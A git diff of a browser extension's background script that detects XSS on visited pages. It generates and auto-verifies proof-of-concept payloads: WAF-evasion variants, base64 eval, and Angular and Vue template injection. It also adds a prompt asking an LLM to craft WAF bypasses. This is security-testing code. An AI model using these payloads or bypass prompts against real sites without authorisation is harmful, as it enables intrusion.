@@ -7,6 +7,8 @@ import { queryICP, queryIPInfo, isInternalHost } from './siteAnalysis';
 import { staticXssDetector } from './staticXssDetector';
 import { verifyXssFindings } from './pocVerifier';
 import { getProvider, resolveAiUrl } from '../utils/aiProviders';
+import { generatePocs, parseReflectionContext, extractParamNames, extractParamValue, wafStrategy, CTX, ENC } from './pocEngine';
+import { runPipeline } from './detectionPipeline';
 
 // Build deterministic POC candidates for reflected XSS (post-process AI result)
 function guessQuoteFromInlineSnippets(inlineSnippets = []) {
@@ -35,96 +37,37 @@ function extractLikelyParamName(vuln, pageParams = []) {
     return null;
 }
 
+/**
+ * 使用 pocEngine 生成上下文感知的 POC payload。
+ * 替代原有的硬编码 buildReflectedXssPayloads。
+ */
 function buildReflectedXssPayloads(quoteChar = '"', context = {}) {
-    const q = quoteChar === '\'' ? "'" : '"';
     const { snippet = '', framework = '' } = context;
+    const paramValue = context.paramValue || 'REF';
 
-    const payloads = [];
-
-    // 1. WAF 绕过（已验证可用）：闭合字符串+对象，unicode 混淆关键字，tagged template 免括号
-    //    放在最前，作为主推 POC —— 质量优先，先给一条能真正打的。
-    payloads.push(
-        `${q}}a=\\u0061lert,a\`1\`,{//`,
-        `${q}}a=\\u0063onfirm,a\`1\`,{//`,
-        `${q};a=\\u0061lert,a\`1\`;//`,
-        `${q};window['al'+'ert']\`1\`;//`
-    );
-
-    // 2. Base sanity-check payloads（明文兜底，便于人工快速确认反射点）
-    payloads.push(
-        `${q};alert(document.domain);//`,
-        `${q};confirm(1);//`
-    );
-
-    // 3. Tagged template (no parentheses)
-    payloads.push(
-        `${q};alert\`1\`;//`,
-        `${q};(alert)\`1\`;//`
-    );
-
-    // 4. HTML entity bypass (for contexts where HTML parsing happens)
-    if (/innerHTML|document\.write|insertAdjacentHTML/.test(snippet)) {
-        payloads.push(
-            `${q}><img src=x onerror=&#97;lert(1)>//`,
-            `${q}><svg/onload=&#x61;lert(1)>//`,
-            `${q}><iframe src=javascript:&#97;lert(1)>//`
-        );
+    // 用 pocEngine 解析上下文 → 生成 POC
+    const parsed = parseReflectionContext(snippet, paramValue);
+    if (!parsed || parsed.exploitability <= 0) {
+        // 兜底：即使 pocEngine 没有识别出上下文，也给几条通用 payload
+        const q = quoteChar === "'" ? "'" : '"';
+        return [...new Set([
+            `${q}}a=\\u0061lert,a\`1\`,{//`,
+            `${q};a=\\u0061lert,a\`1\`;//`,
+            `${q};alert(document.domain)//`,
+        ])];
     }
 
-    // 5. Comment splitting bypass
-    payloads.push(
-        `${q};al/**/ert(1);//`,
-        `${q};a/**/lert(1);//`,
-        `${q};window['al'+'ert'](1);//`
-    );
-
-    // 6. JSFuck-style obfuscation (minimal)
-    payloads.push(
-        `${q};(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]];//`, // Partial JSFuck
-        `${q};top['al'+'ert'](1);//`,
-        `${q};self['al'+'ert'](1);//`
-    );
-
-    // 7. Expression context bypass (if no quotes needed)
-    if (snippet && !snippet.includes(q)) {
-        payloads.push(
-            `;alert(1);//`,
-            `;(alert)(1);//`,
-            `;[alert][0](1);//`
-        );
+    // 让 pocEngine 生成 POC payloads
+    // generatePocs 返回的每个结果都带 { url, payload, strategy }，直接取 payload
+    const mockUrl = 'http://x/_?x=1';
+    const pocs = generatePocs(parsed, mockUrl, 'x');
+    if (!pocs || pocs.length === 0) {
+        const q = quoteChar === "'" ? "'" : '"';
+        return [`${q}}a=\\u0061lert,a\`1\`,{//`];
     }
 
-    // 8. Framework-specific bypasses
-    if (framework.toLowerCase().includes('angular')) {
-        payloads.push(
-            `${q}{{constructor.constructor('alert(1)')()}}${q}`,
-            `${q}{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}${q}`
-        );
-    }
-
-    if (framework.toLowerCase().includes('vue')) {
-        payloads.push(
-            `${q}{{_c.constructor('alert(1)')()}}${q}`,
-            `${q}{{constructor.constructor('alert(1)')()}}${q}`
-        );
-    }
-
-    // 9. Backtick context (if single/double quote doesn't work)
-    if (quoteChar !== '`') {
-        payloads.push(
-            '`;alert(1);//',
-            '`;(alert)(1);//'
-        );
-    }
-
-    // 10. Multiple encoding layers
-    payloads.push(
-        `${q};eval(atob('YWxlcnQoMSk='));//`, // alert(1) base64
-        `${q};eval(String.fromCharCode(97,108,101,114,116,40,49,41));//`
-    );
-
-    // Deduplicate and limit to 15 best payloads
-    return [...new Set(payloads)].slice(0, 15);
+    // 直接取原始 payload 字符串，不靠 URL 反猜
+    return [...new Set(pocs.map(p => p.payload).filter(Boolean))].slice(0, 12);
 }
 
 function buildPocUrls(pageUrl, paramName, payloads) {
@@ -139,20 +82,6 @@ function buildPocUrls(pageUrl, paramName, payloads) {
             u.searchParams.set(paramName, raw);
             out.push(u.toString());
         } catch {}
-    }
-    return out;
-}
-
-function uniqStrings(arr) {
-    const seen = new Set();
-    const out = [];
-    for (const v of arr || []) {
-        if (typeof v !== 'string') continue;
-        const k = v.trim();
-        if (!k) continue;
-        if (seen.has(k)) continue;
-        seen.add(k);
-        out.push(k);
     }
     return out;
 }
@@ -394,7 +323,7 @@ async function probeParamReflection(tabId, pageUrl, pageParamSample = []) {
                 if (allSnippets.length >= 5) break;
             }
 
-            const finalSnippets = uniqStrings(allSnippets).slice(0, 5);
+            const finalSnippets = [...new Set(allSnippets)].slice(0, 5);
             if (finalSnippets.length > 0) {
                 mergeProbeSnippetsToScan(tabId, finalSnippets);
             }
@@ -419,43 +348,46 @@ function enrichReflectedXssPocs(result, { pageUrl, pageParams, inlineSnippets } 
     const vulns = Array.isArray(result.vulnerabilities) ? result.vulnerabilities : [];
     if (vulns.length === 0) return result;
 
-    const quoteChar = guessQuoteFromInlineSnippets(inlineSnippets);
     const snippetText = (inlineSnippets || []).join('\n');
-
-    // Detect framework from snippets
-    let framework = '';
-    if (/\b(vue|Vue|__vue__|v-if|v-for)\b/.test(snippetText)) framework = 'vue';
-    else if (/\b(angular|ng-app|ng-controller)\b/.test(snippetText)) framework = 'angular';
-    else if (/\b(react|React|__REACT__|data-reactroot)\b/.test(snippetText)) framework = 'react';
+    const paramNames = extractParamNames(pageParams || []);
 
     const enriched = vulns.map(v => {
-        // 覆盖所有反射型 XSS 子类型（JS 字符串注入 / 属性注入 / 过滤绕过等），而不仅是 "Reflected XSS"
         if (!v || typeof v.type !== 'string' || !v.type.startsWith('Reflected XSS')) return v;
 
-        const paramName = extractLikelyParamName(v, pageParams) || 'message';
+        const paramName = extractLikelyParamName(v, pageParams) || paramNames[0] || 'message';
 
-        // Build context-aware payloads（buildReflectedXssPayloads 已把 WAF 绕过 payload 排在最前）
-        const context = {
-            snippet: snippetText,
-            framework,
-            quoteChar
-        };
-        const payloads = buildReflectedXssPayloads(quoteChar, context);
-        const deterministic = buildPocUrls(pageUrl, paramName, payloads);
+        // 用 pocEngine 生成上下文感知的 POC
+        // 从 snippet 中找出参数名对应的反射上下文
+        const paramValue = extractParamValue(pageParams, paramName) || 'REF';
+        let ctx = null;
+        if (snippetText.includes(paramValue)) {
+            ctx = parseReflectionContext(snippetText, paramValue);
+        }
 
-        // 质量 > 数量：优先用验证过的 WAF 绕过 POC 作为主推，最多保留 5 条
-        const merged = uniqStrings([
-            ...deterministic,
-            ...(v.poc ? [v.poc] : []),
-            ...(Array.isArray(v.pocs) ? v.pocs : []),
-        ]).slice(0, 5);
+        let pocs = [];
+        if (ctx && ctx.exploitability > 0) {
+            const generated = generatePocs(ctx, pageUrl, paramName);
+            if (generated && generated.length > 0) {
+                pocs = generated.map(p => p.url);
+            }
+        }
 
-        const primary = merged[0] || v.poc || '';
+        // 兜底：如果 pocEngine 没生成，用 AI 自带的
+        if (pocs.length === 0) {
+            pocs = [
+                ...(v.poc ? [v.poc] : []),
+                ...(Array.isArray(v.pocs) ? v.pocs : []),
+            ];
+        }
+
+        // 去重，最多 5 条
+        const seen = new Set();
+        const finalPocs = pocs.filter(p => { const k = p.trim(); if (!k || seen.has(k)) return false; seen.add(k); return true; }).slice(0, 5);
 
         return {
             ...v,
-            poc: primary,
-            pocs: merged,
+            poc: finalPocs[0] || v.poc || '',
+            pocs: finalPocs,
         };
     });
 
@@ -600,6 +532,11 @@ function updateHighVulnBadge(tabId) {
 
 // 主动验证当前标签漏洞结果里的 XSS POC（哪条真弹窗），完成后刷新徽标。
 // 默认开启（settings.pocVerify !== false），可在设置里关闭。
+//
+// 三态结果：
+//   verified       → 弹窗了 ✓ 保持 HIGH
+//   wafBlocked     → 被 WAF 拦 🛡️ 触发 AI 绕过 → 绕过成功 ✓ / 绕过失败 ⛔
+//   falsePositive  → 误报 ✂️ 从结果中删除
 async function verifyAndBadge(tabId, settings) {
     try {
         if (settings?.pocVerify === false) return;
@@ -611,14 +548,48 @@ async function verifyAndBadge(tabId, settings) {
         if (!tabAiStatus[tabId]) tabAiStatus[tabId] = {};
         tabAiStatus[tabId].verify = 'verifying';
 
-        const verifiedCount = await verifyXssFindings(res.vulnerabilities);
+        const { verifiedCount, wafBlockedVulns, falsePositives } = await verifyXssFindings(res.vulnerabilities);
 
-        // 对验证不通过的 XSS 降级：静态检测出的高危但实测打不动，不应该报 HIGH
+        // 1. 误报 → 从结果中彻底移除
+        if (falsePositives.length > 0) {
+            const fpSet = new Set(falsePositives);
+            res.vulnerabilities = res.vulnerabilities.filter(v => !fpSet.has(v));
+        }
+
+        // 2. WAF 拦截 → 尝试 AI 辅助绕过
+        if (wafBlockedVulns.length > 0 && settings?.aiKey && settings?.aiAnalysis) {
+            for (const v of wafBlockedVulns) {
+                v.verdict = 'bypassing_ai'; // UI 显示"⏳ AI 绕过中"
+                try {
+                    const bypassSuccess = await aiWafBypass(tabId, v, res, settings);
+                    if (bypassSuccess) {
+                        verifiedCount++;
+                        v.verified = true;
+                        v.verdict = 'verified';
+                        v.confidence = 0.98;
+                        v.analysis = (v.analysis || '') + '\n\n✅ AI 辅助绕过 WAF 成功：生成的自定义 POC 已实测弹窗。';
+                    } else {
+                        v.verdict = 'bypass_failed';
+                        v.analysis = (v.analysis || '') + '\n\n⛔ AI 辅助绕过失败：大模型生成的自定义绕过 POC 仍被 WAF 拦截或未触发弹窗。反射点确实存在但当前 WAF 防护较强。';
+                    }
+                } catch {
+                    v.verdict = 'waf_blocked';
+                    v.analysis = (v.analysis || '') + '\n\n🛡️ POC 均被 WAF 拦截，AI 绕过调用失败。';
+                }
+            }
+        } else if (wafBlockedVulns.length > 0) {
+            // 没配 AI，标记为 WAF 拦截但无法自动绕过
+            for (const v of wafBlockedVulns) {
+                v.verdict = 'waf_blocked';
+                v.analysis = (v.analysis || '') + '\n\n🛡️ POC 均被 WAF 拦截。配置 AI API Key 可启用自动绕过尝试。';
+            }
+        }
+
+        // 3. 对于标记为 bypass_failed 的，保持 HIGH 但降低置信度
         for (const v of res.vulnerabilities) {
-            if (v.type?.toLowerCase().includes('xss') && v.verified === false) {
-                v.severity = 'low';
-                v.confidence = 0.3;
-                v.analysis = (v.analysis || '') + '\n\n⚠️ POC 未通过实测验证：后台加载候选 POC 后未检测到弹窗。可能被 WAF 拦截、反射点不可利用或上下文判断有误，请手动验证。';
+            if (v.verdict === 'bypass_failed') {
+                v.severity = 'high';
+                v.confidence = 0.65;
             }
         }
 
@@ -651,6 +622,79 @@ const tabVulnTimers = {};      // debounce timers per tab
 const tabFilterTimers = {};    // debounce timers for AI filter
 const tabAiStatus = {};        // tabId -> { filter: 'idle'|'analyzing'|'done'|'error', vuln: 'idle'|'analyzing'|'done'|'error' }
 const tabStaticXssTimers = {}; // debounce timers for static XSS detection
+
+/**
+ * AI 辅助 WAF 绕过：当本地绕过策略全部被 WAF 拦截时，
+ * 将反射上下文 + 失败的 POC 发给 AI，让 AI 生成自定义绕过 payload 并尝试验证。
+ * @returns {boolean} 是否绕过成功
+ */
+async function aiWafBypass(tabId, vuln, res, settings) {
+    // 构造 bypass 上下文：从 tabScanResults 取 snippet
+    const scan = tabScanResults[tabId] || {};
+    const snippetText = [
+        ...(scan.inlineScriptSnippet || []),
+        ...(scan.inlineScriptProbeSnippet || []),
+        ...(scan.inlineScriptSinkSnippet || []),
+    ].slice(0, 3).join('\n---\n').slice(0, 2000);
+
+    const promptPayload = {
+        task: 'waf_bypass',
+        pageUrl: res.pageUrl || '',
+        vulnType: vuln.type || '',
+        source: vuln.source || '',
+        sink: vuln.sink || '',
+        pocs: (Array.isArray(vuln.pocs) ? vuln.pocs : []).slice(0, 3),
+        contextSnippet: snippetText,
+    };
+
+    try {
+        const aiBypass = await callAI(
+            settings.aiKey, settings.aiProvider || 'openai',
+            settings.aiModel, settings.aiEndpoint,
+            promptPayload, 'waf_bypass'
+        );
+
+        if (!aiBypass?.pocs || aiBypass.pocs.length === 0) return false;
+
+        // 用 AI 生成的 payload 构造完整 POC URL
+        const aiPocs = aiBypass.pocs.slice(0, 3);
+        const aiPocUrls = [];
+        const paramName = extractLikelyParamName(vuln, []) || 'message';
+
+        for (const raw of aiPocs) {
+            try {
+                const u = new URL(res.pageUrl || vuln.pocs?.[0] || 'http://x/?x=1');
+                if (u.searchParams.has(paramName)) {
+                    u.searchParams.set(paramName, raw);
+                } else {
+                    // 如果 paramName 不对，尝试用第一个已有参数的 key
+                    const keys = [...u.searchParams.keys()];
+                    if (keys.length > 0) u.searchParams.set(keys[0], raw);
+                    else u.searchParams.set('x', raw);
+                }
+                aiPocUrls.push(u.toString());
+            } catch {}
+        }
+
+        if (aiPocUrls.length === 0) return false;
+
+        // 导入验证器尝试 AI 生成的 POC
+        const { verifyXssFindings } = await import('./pocVerifier');
+        const testVuln = { ...vuln, pocs: aiPocUrls };
+        const bypassResult = await verifyXssFindings([testVuln]);
+
+        if (bypassResult.verifiedCount > 0) {
+            vuln.verified = true;
+            vuln.verifiedPocs = bypassResult.verifiedPocs || [];
+            vuln.pocs = bypassResult.verifiedPocs || aiPocUrls;
+            vuln.poc = (bypassResult.verifiedPocs || [])[0] || aiPocUrls[0];
+            return true;
+        }
+        return false;
+    } catch {
+        return false;
+    }
+}
 
 // Inline-script parameter reflection probe (lightweight, same-origin)
 const tabProbeStatus = {};     // tabId -> { running?: boolean, done?: boolean, cacheKey?: string }
@@ -756,62 +800,140 @@ async function autoAnalyzeVulns(tabId, pageUrl) {
 
     const settings = await new Promise(r => chrome.storage.local.get('settings', d => r(d.settings || {})));
 
-    // 执行静态检测
-    const staticResults = staticXssDetector.analyze(scanData, pageUrl);
-
-    // 如果AI关闭，直接使用静态检测结果
+    // 如果AI未配置，使用流水线检测（上下文分析 + POC 生成 + 验证）
     if (!settings.aiKey || !settings.aiAnalysis) {
-        if (staticResults.vulnerabilities.length > 0) {
-            tabVulnResults[tabId] = staticResults;
+        const pipelineResults = await runPipeline(scanData, pageUrl, settings);
+        if (pipelineResults && pipelineResults.vulnerabilities.length > 0) {
+            tabVulnResults[tabId] = pipelineResults;
             if (!tabAiStatus[tabId]) tabAiStatus[tabId] = {};
             tabAiStatus[tabId].vuln = 'done';
             updateHighVulnBadge(tabId);
-            await verifyAndBadge(tabId, settings);
         }
         return;
     }
 
-    // If we have params + sink evidence but no direct reflection, do a lightweight same-origin probe
+    // --- AI 路径（两段式：先跑本地流水线发现反射，需要时才发 JS 给 AI） ---
+
+    // 第1步：运行本地流水线（0 token）
+    // 从 pageParams + snippets 中发现反射点，做上下文分析，生成 POC
+    const pipelineResults = await runPipeline(scanData, pageUrl, { pocVerify: false }); // 不在这步验证，最后统一验证
+    const hasPipelineFindings = pipelineResults && pipelineResults.vulnerabilities.length > 0;
+
+    // 第2步：如果有反射证据，走 Tier 1（廉价）——只发上下文 snippet 给 AI 确认
+    // 不发整份 JS 文件，只发 ~200 字符的上下文片段
+    if (hasPipelineFindings) {
+        if (!tabAiStatus[tabId]) tabAiStatus[tabId] = {};
+        tabAiStatus[tabId].vuln = 'analyzing';
+
+        const snippetText = buildContextSnippetForAI(pipelineResults.vulnerabilities, scanData);
+        const aiConfirmPayload = {
+            task: 'xss_validate',
+            pageUrl,
+            pageParams: scanData.pageParamSample || [],
+            // 只发发现反射的 snippet 上下文，不 JS 内容
+            reflectionContexts: snippetText,
+            candidates: pipelineResults.vulnerabilities.map(v => ({
+                type: v.type,
+                param: v.source,
+                sink: v.sink,
+                poc: v.poc,
+            })),
+        };
+
+        try {
+            const aiResult = await callAI(settings.aiKey, settings.aiProvider || 'openai', settings.aiModel, settings.aiEndpoint, aiConfirmPayload, 'xss_validate');
+            // AI 返回：哪些是真的 + 补充 POC
+            if (aiResult?.vulnerabilities?.length > 0) {
+                // AI 确认的用 AI 结果，AI 没提的保留 pipeline 结果
+                const aiKeyed = new Map((aiResult.vulnerabilities || []).map(v => [`${v.source}|${v.sink}`.toLowerCase(), v]));
+                for (const v of pipelineResults.vulnerabilities) {
+                    const k = `${v.source}|${v.sink}`.toLowerCase();
+                    const aiV = aiKeyed.get(k);
+                    if (aiV) {
+                        // AI 确认了：提升置信度，合并 POC
+                        v.confidence = Math.max(v.confidence || 0, aiV.confidence || 0.7);
+                        if (aiV.poc || Array.isArray(aiV.pocs)) {
+                            const merged = new Set([...(Array.isArray(v.pocs) ? v.pocs : [v.poc].filter(Boolean)), ...(Array.isArray(aiV.pocs) ? aiV.pocs : [aiV.poc].filter(Boolean))]);
+                            v.pocs = [...merged].slice(0, 5);
+                            v.poc = v.pocs[0] || v.poc;
+                        }
+                    }
+                    // AI 没提到但 pipeline 发现的：保持原样（置信度较低）
+                }
+                tabVulnResults[tabId] = { ...pipelineResults, vulnerabilities: pipelineResults.vulnerabilities, analyzedAt: Date.now() };
+            } else {
+                // AI 没确认任何，但 pipeline 有发现：保留 pipeline 结果
+                tabVulnResults[tabId] = { ...pipelineResults, analyzedAt: Date.now() };
+            }
+        } catch {
+            // AI 调用失败：保留 pipeline 结果
+            tabVulnResults[tabId] = { ...pipelineResults, analyzedAt: Date.now() };
+        }
+
+        tabAiStatus[tabId].vuln = 'done';
+        updateHighVulnBadge(tabId);
+        await verifyAndBadge(tabId, settings);
+        return;
+    }
+
+    // --- 第3步：没有反射证据，需要深度分析（成本高） ---
+    // 下载 JS 文件发给 AI 做 source→sink 追踪，找 DOM XSS / Open Redirect / SSRF
+
     if (shouldProbeReflection(scanData, settings)) {
         try {
             await probeParamReflection(tabId, pageUrl, pageParams);
         } catch {}
     }
 
-    // Refresh scanData view after probe merged
     const scanData2 = tabScanResults[tabId] || scanData;
     const inlineProbeSnippets2 = scanData2.inlineScriptProbeSnippet || [];
+    // 第二次检查：probe 后有没有新增反射证据
+    const hasProbeEvidence = (scanData2.inlineScriptProbeSnippet || []).length > 0;
+    const hasSinkEvidence = (scanData2.inlineScriptSinkSnippet || []).length > 0;
+
+    // 如果 probe 后发现了反射，用 pipeline + AI 快捷确认
+    if (hasProbeEvidence) {
+        const probePipeline = await runPipeline(scanData2, pageUrl, { pocVerify: false });
+        if (probePipeline?.vulnerabilities?.length > 0) {
+            tabVulnResults[tabId] = { ...probePipeline, analyzedAt: Date.now() };
+            tabAiStatus[tabId].vuln = 'done';
+            updateHighVulnBadge(tabId);
+            await verifyAndBadge(tabId, settings);
+            return;
+        }
+    }
+
+    // 真的没有反射证据，且没有 sink 证据 → 跳过
+    if (!hasSinkEvidence && !hasProbeEvidence && jsFiles.length === 0) {
+        if (!tabVulnResults[tabId]) tabVulnResults[tabId] = { vulnerabilities: [], summary: '未发现明显反射证据', analyzedAt: Date.now() };
+        return;
+    }
+
+    // --- Tier 2: 深度 JS 分析（仅当无反射证据时才执行，省 token） ---
 
     if (!tabAiStatus[tabId]) tabAiStatus[tabId] = {};
     tabAiStatus[tabId].vuln = 'analyzing';
-
-    const finalizeNoFindings = (reason = '') => {
-        // mark as done so UI won't look stuck
+    const finalizeDeepNoFindings = (reason = '') => {
         tabAiStatus[tabId].vuln = 'done';
         if (!tabVulnResults[tabId]) tabVulnResults[tabId] = { vulnerabilities: [], summary: reason, analyzedAt: Date.now() };
         updateHighVulnBadge(tabId);
     };
 
     // Resolve relative URLs against pageUrl, filter third-party/CDN
-    // Smart prioritization: prefer non-CDN, smaller files first (likely app code)
     const jsUrls = jsFiles.map(u => {
         try { return new URL(u, pageUrl).href; } catch { return null; }
     }).filter(u => {
         if (!u) return false;
         try {
-            // skip known CDN/lib hostnames
             if (/(jquery|bootstrap|lodash|vue\.min|react\.min|angular|gtm\.js|google-analytics|facebook|twitter\.com\/widgets|cdn\.|cloudflare|jsdelivr|unpkg)/i.test(u)) return false;
             return true;
         } catch { return false; }
     });
-
-    // Prioritize: same-origin first, then sort by URL length (shorter = likely main app bundle)
     const pageOrigin = new URL(pageUrl).origin;
     const sameOrigin = jsUrls.filter(u => u.startsWith(pageOrigin)).sort((a, b) => a.length - b.length);
     const crossOrigin = jsUrls.filter(u => !u.startsWith(pageOrigin)).sort((a, b) => a.length - b.length);
-    const prioritized = [...sameOrigin, ...crossOrigin].slice(0, 5); // increased from 3 to 5
+    const prioritized = [...sameOrigin, ...crossOrigin].slice(0, 5);
 
-    // Smart JS extraction: prioritize files with source/sink patterns
     const fetchOne = async (url) => {
         const r = await fetch(url, { credentials: 'omit', signal: AbortSignal.timeout(6000) });
         const text = await r.text();
@@ -848,7 +970,7 @@ async function autoAnalyzeVulns(tabId, pageUrl) {
 
     // If we have neither JS nor reflected evidence, nothing to analyze
     if (jsContents.length === 0 && !hasReflectedEvidence) {
-        finalizeNoFindings('未能获取可分析的 JS 内容');
+        finalizeDeepNoFindings('未能获取可分析的 JS 内容');
         return;
     }
 
@@ -858,14 +980,10 @@ async function autoAnalyzeVulns(tabId, pageUrl) {
 
     // If no reflected evidence, keep existing source/sink gate to avoid meaningless AI calls
     if (!hasReflectedEvidence) {
-        // In our testcases, the main sink is often postMessage -> innerHTML.
-        // If we only gate on sinkRe, we might skip analysis when the fetched JS snippets don't include obvious sinks.
-        // Require either a sink OR a clear attacker-controlled source to proceed.
         if (!sinkRe.test(combined) && !sourceRe.test(combined)) {
-            finalizeNoFindings('未发现明显危险 source/sink，跳过 AI 分析');
+            finalizeDeepNoFindings('未发现明显危险 source/sink，跳过 AI 分析');
             return;
         }
-        // If sink exists but source not found, still allow AI (some apps pass taint indirectly)
     }
 
     try {
@@ -927,20 +1045,19 @@ async function autoAnalyzeVulns(tabId, pageUrl) {
             tabVulnResults[tabId] = { vulnerabilities: [], summary: result?.summary || '未发现可利用漏洞', analyzedAt: Date.now() };
         }
 
-        // 合并静态检测结果（去重）
-        if (staticResults.vulnerabilities.length > 0) {
-            const merged = mergeVulnResults(staticResults, tabVulnResults[tabId]);
-            tabVulnResults[tabId] = merged;
-        }
-
-        const highVulnCount = getHighVulnCount(tabId);
+        // ❌ 不再合并静态检测结果。当 AI 配置且跑通时，AI 是唯一判断标准。
+        // 静态检测只作为 AI 不可用/失败时的降级方案。
+        // 原因：静态检测的误报率高（尤其 JS 字符串注入），合并会把 AI 已滤掉的假阳带回。
+        // if (staticResults.vulnerabilities.length > 0) { ... }
 
         tabAiStatus[tabId].vuln = 'done';
         updateHighVulnBadge(tabId);
 
-        // 主动验证 POC（实测哪条能弹窗）
+        // 主动验证 POC（实测哪条能弹窗，未验证通过的降为 LOW）
         await verifyAndBadge(tabId, settings);
 
+        // 验证完成后再判断是否发通知（避免验证前的 highCount 不准确）
+        const highVulnCount = getHighVulnCount(tabId);
         if (highVulnCount > 0) {
             const tab = await chromeTabsGet(tabId);
             let pageHost = '当前页面';
@@ -957,42 +1074,28 @@ async function autoAnalyzeVulns(tabId, pageUrl) {
         }
     } catch {
         tabAiStatus[tabId].vuln = 'error';
-        // AI失败时降级使用静态检测结果
-        if (staticResults.vulnerabilities.length > 0) {
-            tabVulnResults[tabId] = staticResults;
+        // AI失败时降级使用 pipeline 检测
+        const fallbackResults = await runPipeline(scanData, pageUrl, settings);
+        if (fallbackResults && fallbackResults.vulnerabilities.length > 0) {
+            tabVulnResults[tabId] = fallbackResults;
             tabAiStatus[tabId].vuln = 'done';
             updateHighVulnBadge(tabId);
-            await verifyAndBadge(tabId, settings);
         }
     }
 }
 
-// 合并静态检测和AI结果（去重）
-function mergeVulnResults(staticResults, aiResults) {
-    const merged = { ...aiResults };
-    const aiFingerprints = new Set(
-        (aiResults.vulnerabilities || []).map(v =>
-            `${v.type}:${v.source}:${v.sink}`.toLowerCase()
-        )
-    );
-
-    for (const staticVuln of staticResults.vulnerabilities) {
-        const fingerprint = `${staticVuln.type}:${staticVuln.source}:${staticVuln.sink}`.toLowerCase();
-        if (!aiFingerprints.has(fingerprint)) {
-            staticVuln.detectionMethod = 'static';
-            merged.vulnerabilities.push(staticVuln);
-        }
-    }
-
-    // 更新摘要
-    if (merged.vulnerabilities.length > 0) {
-        const highCount = merged.vulnerabilities.filter(v => v.severity === 'high').length;
-        const staticCount = merged.vulnerabilities.filter(v => v.detectionMethod === 'static').length;
-        merged.summary = `发现 ${merged.vulnerabilities.length} 个漏洞`;
-        if (staticCount > 0) merged.summary += `（含 ${staticCount} 个静态检测）`;
-    }
-
-    return merged;
+/**
+ * 从 pipeline 结果中提取上下文片段传给 AI 做廉价确认（~200 tokens）。
+ * 不传 JS 文件内容，只传反射点周围的 snippet。
+ */
+function buildContextSnippetForAI(vulnerabilities, scanData) {
+    const allSnippets = [
+        ...(scanData.inlineScriptSnippet || []),
+        ...(scanData.inlineScriptSinkSnippet || []),
+        ...(scanData.inlineScriptProbeSnippet || []),
+    ];
+    // 只取前 5 条最短的 snippet（足够确认，省 token）
+    return allSnippets.sort((a, b) => a.length - b.length).slice(0, 5).join('\n---\n').slice(0, 2000);
 }
 
 // AI filter helper (exported for use by other modules)
@@ -1016,6 +1119,62 @@ export async function callAI(apiKey, provider, model, endpoint, data, task = 'fi
 4. 其他分类: 移除明显误报和重复项。
 
 只返回JSON对象，结构与输入相同，不要任何额外文字。`,
+        xss_validate: `你是XSS漏洞确认专家。你的任务不是"发现"漏洞，而是"验证"本地引擎发现的候选漏洞。
+
+输入已经包含：
+- candidates：本地检测引擎发现的候选漏洞（含类型、参数名、sink）
+- reflectionContexts：反射点的HTML/JS上下文片段
+
+你的工作：
+1. 检查每个candidate的上下文是否真的可利用
+2. 如果上下文被正确转义（HTML实体/JS转义/JSON.stringify），标记为不可用
+3. 如果参数值在JSON键位置("key":)或注释中，标记为不可用
+4. 如果确实可利用，输出confidence和更好的POC（可选）
+
+输出格式（JSON数组，每个元素一条确认的漏洞）：
+[
+  {
+    "source": "URL parameter: xxx",
+    "sink": "JavaScript string literal",
+    "confidence": 0.85,
+    "analysis": "确认原因",
+    "poc": "完整的POC URL或payload",
+    "pocs": ["备用POC"]
+  }
+]
+
+如果全部不可用，输出空数组 []。
+不要输出任何额外文字，只输出JSON。`,
+    waf_bypass: `你是一个XSS WAF绕过专家。你的任务是在本地绕过策略全部被WAF拦截时，生成能够突破该WAF的自定义payload。
+
+输入包含：
+- vulnType: 漏洞类型
+- source: 参数名
+- sink: 危险点（如 JavaScript string literal / HTML body / innerHTML）
+- pocs: 已被 WAF 拦截的失败 POC URL 列表（供你分析 WAF 拦截了什么特征）
+- contextSnippet: 反射点周围的 HTML/JS 代码片段
+
+你的工作：
+1. 分析失败 POC 中被 WAF 拦截的特征（关键字、特殊字符模式）
+2. 结合 contextSnippet 判断反射点的精确上下文
+3. 生成 1-3 条绕过 WAF 的自定义 payload（不做 URL 编码，只给原始 payload 字符串）
+
+绕过策略参考（不限于此）：
+- 大小写混淆：OnErRoR、OnLoAd、Javascript
+- HTML 实体编码：&#97;lert、&#106;avascript
+- Unicode 转义（仅在 JS 字符串上下文）：\\u0061lert
+- 标签复用：<img src=x onerror=> 用 autofocus + onfocus 代替
+- 事件替换：onerror → onfocus、ontoggle、onmouseover
+- 关键字拆分：top[/al/.source+/ert/.source]、window['al'+'ert']
+- eval + base64：eval(atob('base64编码的alert(1)'))
+- 注释绕过：al/**/ert(1)
+- 使用 confirm 或 prompt 代替 alert
+- ⭐ silent marker 绕过（推荐）：document.title='__NOTHING_POC__';document.cookie='__NOTHING_POC=1'  （WAF 从不拦这个，所有 payload 优先附带）
+
+只输出JSON（不要任何额外文字），格式：
+{
+  "pocs": ["第一条payload", "第二条payload", "第三条payload"]
+}`,
         xss: `你是资深渗透测试工程师，专注前端安全漏洞挖掘。
 
 请基于输入的数据（可能包含 JS 源码 + 页面 URL 参数样本 + 内联脚本片段），尽可能从代码/脚本层面挖掘以下类型的”可利用”漏洞，并给出可复现的测试 POC：
@@ -1655,6 +1814,8 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
 chrome.runtime.onInstalled.addListener(() => {
     console.log('Nothing extension installed');
     setupOffscreenDocument('src/offscreen/offscreen.html');
+    // Load WAF strategy scores from storage
+    wafStrategy.load();
     // Set default N icon for all tabs
     chrome.tabs.query({}, (tabs) => {
         tabs.forEach(tab => { if (tab.id) setNIcon(tab.id, 0); });
